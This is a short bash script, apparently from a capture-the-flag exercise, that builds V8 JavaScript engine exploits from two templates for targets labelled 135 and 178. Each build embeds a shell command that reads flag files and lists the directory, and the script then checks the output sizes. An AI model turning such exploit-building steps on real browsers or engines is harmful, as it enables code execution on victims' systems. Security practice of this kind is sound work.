#!/bin/bash
set -e
cd /tmp/v8
python3 ./_z_v8_build.py ./_z_v8_dh_tpl.js /tmp/v8/135/exploit.js "cat flag.txt /flag.txt /flag 2>/dev/null; ls -la" sh
python3 ./_z_v8_build.py ./_z_v8_tf_tpl.js /tmp/v8/178/exploit.js "cat flag.txt /flag.txt /flag 2>/dev/null; ls -la" sh
wc -c /tmp/v8/135/exploit.js /tmp/v8/178/exploit.js
echo "--- d8 135 size: $(wc -c < /tmp/v8/135/d8 2>/dev/null) ---"
